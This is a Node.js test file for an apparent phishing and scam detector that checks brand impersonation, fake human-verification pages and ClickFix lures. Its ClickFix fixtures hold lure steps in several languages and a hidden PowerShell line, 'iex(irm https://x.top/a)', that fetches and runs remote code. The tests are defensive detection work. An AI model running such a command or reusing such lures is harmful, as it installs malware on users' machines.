const test = require('node:test');
const assert = require('node:assert/strict');
const pageSignals = require('../src/lib/pageSignals.js');

test('brandsInText respects ambiguous-name rules', () => {
  assert.deepEqual(pageSignals.brandsInText('Sign in to your PayPal account'), ['PayPal']);
  assert.deepEqual(pageSignals.brandsInText('Apple ID - Sign in'), ['Apple']);
  assert.deepEqual(pageSignals.brandsInText('Fresh apple pie recipe'), []);
  assert.deepEqual(pageSignals.brandsInText('We accept Visa and Mastercard'), []);
  assert.deepEqual(pageSignals.brandsInText('Chase Bank Online'), ['Chase']);
  assert.deepEqual(pageSignals.brandsInText('Chase your dreams'), []);
  assert.deepEqual(pageSignals.brandsInText('UPS Tracking - My Choice'), ['UPS']);
  assert.ok(pageSignals.brandsInText('Portal das Finanças - Reembolso').includes('Autoridade Tributária'));
});

test('countBrandMentions counts occurrences', () => {
  const c = pageSignals.countBrandMentions('paypal paypal paypal netflix');
  assert.equal(c.PayPal, 3);
  assert.equal(c.Netflix, 1);
});

function fakeDoc(favicon) {
  const el = (attrs) => ({ getAttribute: (n) => attrs[n] || null });
  return {
    title: 'Broker', body: { innerText: 'Welcome', getAttribute: () => null }, documentElement: { getAttribute: () => null },
    querySelector: () => null,
    querySelectorAll: (sel) => (sel.includes('icon') && !sel.includes('stylesheet') ? [el({ href: favicon })] : []),
  };
}
const loc = { href: 'https://www.broker.example/', hostname: 'www.broker.example', protocol: 'https:' };

test('a favicon on customer cloud storage is not a hot-linked brand asset', () => {
  assert.deepEqual(pageSignals.collect(fakeDoc('https://storage.googleapis.com/broker-assets/favicon.ico'), loc).brandAssets, []);
  assert.deepEqual(pageSignals.collect(fakeDoc('https://my-bucket.s3.amazonaws.com/favicon.ico'), loc).brandAssets, []);
  const hot = pageSignals.collect(fakeDoc('https://www.paypal.com/favicon.ico'), loc).brandAssets;
  assert.equal(hot.length, 1);
  assert.equal(hot[0].brand, 'PayPal');
});

test('a page titled Revolut.Me on revolut.me is not an impersonation, but on another host it is', () => {
  const brands = require('../src/lib/brands.js');
  const revolut = brands.findByDomain('revolut.me');
  assert.equal(revolut.name, 'Revolut');
  assert.ok(revolut.domains.includes('revolut.com'));
  assert.equal(brands.findByDomain('revolut-me.com'), null);
  assert.deepEqual(pageSignals.brandsInText('Revolut.Me'), ['Revolut']);
});

// ---- Fake human checks and ClickFix ----
function pageDoc({ title = '', text = '', hidden = '', scripts = [], inlineScripts = [] }) {
  const el = (attrs, textContent) => ({ getAttribute: (n) => attrs[n] || null, textContent: textContent || '' });
  return {
    title,
    body: { innerText: text, textContent: text + ' ' + hidden, getAttribute: () => null },
    documentElement: { getAttribute: () => null },
    querySelector: () => null,
    querySelectorAll: (sel) => {
      if (sel === 'script[src], iframe[src]') return scripts.map((src) => el({ src }));
      if (sel === 'script:not([src])') return inlineScripts.map((t) => el({}, t));
      return [];
    },
  };
}
const gateLoc = { href: 'https://cerreotop.top/', hostname: 'cerreotop.top', protocol: 'https:' };

test('a "verify you are human" box without a real CAPTCHA service is noticed', () => {
  const fake = pageSignals.collect(pageDoc({ title: 'Verify you are human', text: 'Verify you are human' }), gateLoc);
  assert.equal(fake.humanCheck, true);
  assert.equal(fake.captchaProvider, false);
  assert.equal(fake.clickFix, '');
  for (const scripts of [['https://challenges.cloudflare.com/turnstile/v0/api.js'], ['https://www.google.com/recaptcha/api.js'], ['https://js.hcaptcha.com/1/api.js'], ['/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1?ray=1']]) {
    assert.equal(pageSignals.collect(pageDoc({ title: 'Just a moment...', text: 'Verifying you are human. This may take a few seconds.', scripts }), gateLoc).captchaProvider, true, scripts[0]);
  }
  assert.equal(pageSignals.collect(pageDoc({ title: 'Just a moment...', text: 'Verifying you are human.', inlineScripts: ['window._cf_chl_opt={cvId:"3"}'] }), gateLoc).captchaProvider, true);
});

test('human-check wording in four languages', () => {
  for (const t of ['Verify you are human', "I'm not a robot", 'Verifique se você é humano', 'Não sou um robô', 'Verifica que eres humano', 'No soy un robot', 'Veuillez vérifier que vous êtes humain', 'Je ne suis pas un robot']) assert.ok(pageSignals.isHumanCheck(t), t);
  for (const t of ['Human resources portal', "Making sure you're not a bot!", 'Robot vacuum cleaners']) assert.ok(!pageSignals.isHumanCheck(t), t);
});

test('ClickFix instructions are found in any language, even hidden or in a script', () => {
  const steps = {
    en: 'Verification steps: 1. Press Windows Button "⊞" + R 2. Press CTRL + V 3. Press Enter',
    pt: 'Passos de verificação: prima a tecla Windows + R, depois Ctrl + V e Enter.',
    es: 'Pasos de verificación: presione Windows + R, pegue con Ctrl + V y pulse Intro.',
    fr: 'Étapes de vérification : appuyez sur Windows + R puis Ctrl + V et Entrée.',
    mac: 'To verify, press Command + Space, type Terminal, press Enter, then Cmd + V.',
  };
  for (const [k, s] of Object.entries(steps)) {
    const r = pageSignals.collect(pageDoc({ title: 'Verify you are human', text: "I'm not a robot", hidden: s }), gateLoc);
    assert.ok(r.clickFix, k);
  }
  const clip = pageSignals.collect(pageDoc({ title: 'reCAPTCHA', text: 'Verify you are human', inlineScripts: ['navigator.clipboard.writeText("powershell -w h -c iex(irm https://x.top/a)")'] }), gateLoc);
  assert.match(clip.clickFix, /powershell/);
});

test('ClickFix is not reported for articles, long tutorials or install guides', () => {
  const article = 'Hackers use ClickFix: a fake CAPTCHA tells you to press Win + R, then Ctrl + V and Enter.';
  assert.equal(pageSignals.collect(pageDoc({ title: 'ClickFix explained', text: article }), gateLoc).clickFix, '');
  const tutorial = 'How to open the hosts file. Press Win + R, then press Ctrl + V to paste the path. ' + 'Lorem ipsum dolor sit amet. '.repeat(300);
  assert.equal(pageSignals.collect(pageDoc({ title: 'Edit the hosts file', text: tutorial }), gateLoc).clickFix, '');
  const install = pageSignals.collect(pageDoc({ title: 'Install', text: 'Paste that in a macOS Terminal prompt.', inlineScripts: ['navigator.clipboard.writeText("curl -fsSL https://example.org/install.sh | bash")'] }), gateLoc);
  assert.equal(install.clickFix, '');
});

test('new brands are recognised in titles only in an account or payment context', () => {
  assert.deepEqual(pageSignals.brandsInText('SunPass Login - Pay tolls'), ['SunPass']);
  assert.deepEqual(pageSignals.brandsInText('E-PASS and SunPass accepted here'), []);
  assert.deepEqual(pageSignals.brandsInText('InPost - Śledzenie przesyłki'), ['InPost']);
  assert.deepEqual(pageSignals.brandsInText('Dostawa InPost Paczkomat 24/7'), []);
  assert.deepEqual(pageSignals.brandsInText('DGT: pago de multas'), ['DGT (tráfico)']);
  assert.deepEqual(pageSignals.brandsInText('La DGT avisa de los atascos'), []);
  assert.deepEqual(pageSignals.brandsInText('E-ZPass New York - Pay toll'), []);
});

test('pages that warn about scams are recognised, phishing titles are not', () => {
  for (const t of ['DMV, Traffic Ticket or Parking Fee Texts May Be a Scam', 'Got a text about unpaid tolls, is this a scam? : r/Scams', 'Burla: SMS falso da Via Verde', 'Estafa de la DGT con multas falsas', 'Arnaque aux fausses amendes ANTAI']) assert.ok(pageSignals.isAwareness(t), t);
  for (const t of ['Chase Fraud Alert - Verify your identity', 'This is not a scam - guaranteed returns', 'E-ZPass - Pay your toll']) assert.ok(!pageSignals.isAwareness(t), t);
});
